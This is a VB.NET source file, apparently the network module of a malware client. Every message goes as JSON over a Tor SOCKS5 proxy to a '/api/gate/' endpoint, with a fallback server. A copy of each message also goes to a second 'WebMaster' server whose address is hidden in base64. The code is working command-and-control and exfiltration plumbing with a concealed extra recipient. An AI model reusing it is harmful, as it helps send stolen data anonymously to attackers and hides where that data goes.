Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports Newtonsoft.Json
Imports Starksoft.Aspen.Proxy

Public Class SendHTTPonTor
    Private proxyClient As Socks5ProxyClient
    Public write As StreamWriter
    Public TCP As New TcpClient
    Private WebMaster As Boolean = False
    Public Sub TalkChannelHTTP(ByVal msg As Object, ByVal att As String, ByVal address As String, ByVal ServerReachPort As Integer)
        Dim JsonString As String = JsonConvert.SerializeObject(msg).Replace("\n", "").Replace("\r", "")
        Dim Body = Encoding.UTF8.GetBytes(JsonString)
        Dim bodyLength As Integer = Encoding.UTF8.GetByteCount(JsonString)
        Try

            Dim headerContent = New StringBuilder()
            headerContent.AppendLine("POST /api/gate/" & att & " HTTP/1.1")
            headerContent.AppendLine("Content-Type: application/json")
            headerContent.AppendLine("User-Agent: Client/1.0")
            headerContent.AppendLine("Accept: */*")
            headerContent.AppendLine("Host: " & IPAddress.Loopback.ToString() & ":" & Config.Variables.ServerReachPort)
            headerContent.AppendLine("Accept-Encoding: gzip, deflate, br")
            headerContent.AppendLine("Connection: keep-alive")
            headerContent.AppendLine("Content-Length: " & bodyLength)
            headerContent.AppendLine()

            Dim headerString As String = headerContent.ToString
            Dim header = Encoding.UTF8.GetBytes(headerString)
            Dim headerLength As Integer = Encoding.UTF8.GetByteCount(headerString)

            proxyClient = New Socks5ProxyClient(IPAddress.Loopback.ToString(), Config.Variables.SocketPort) With {
                .ProxyUserName = "",
                .ProxyPassword = ""
            }
            TCP = proxyClient.CreateConnection(address, ServerReachPort)

            Using stream = TCP.GetStream()
                stream.Write(header, 0, headerLength)
                stream.Write(Body, 0, bodyLength)
                stream.Flush()
            End Using
            If Config.Variables.Debug Then
                Dim reader = New StreamReader(TCP.GetStream()) 'Debug
                Console.WriteLine("Send!...")
                Console.WriteLine(header)
                While reader.Peek > -1
                    Console.Write(Convert.ToChar(reader.Read()).ToString)
                End While
            End If
            TCP.Client.Close()
        Catch ex As Exception
            TalkChannelHTTP(msg, att, Config.Variables.FallbackAdress, Config.Variables.FallbackServerReachPort)
            If Config.Variables.Debug Then
                Console.WriteLine("Connection error: " & ex.ToString)
            End If
        End Try
        If Not WebMaster Then
            WebMasterServer(msg, att)
        End If
    End Sub
    Private Sub WebMasterServer(ByVal msg As Object, ByVal att As String)
        WebMaster = True
        Dim address As String = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(Config.Variables.WebMasterAddress))
        Dim port As String = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(Config.Variables.WebMasterPort))
        TalkChannelHTTP(msg, att, address, port)
        WebMaster = False
    End Sub
End Class
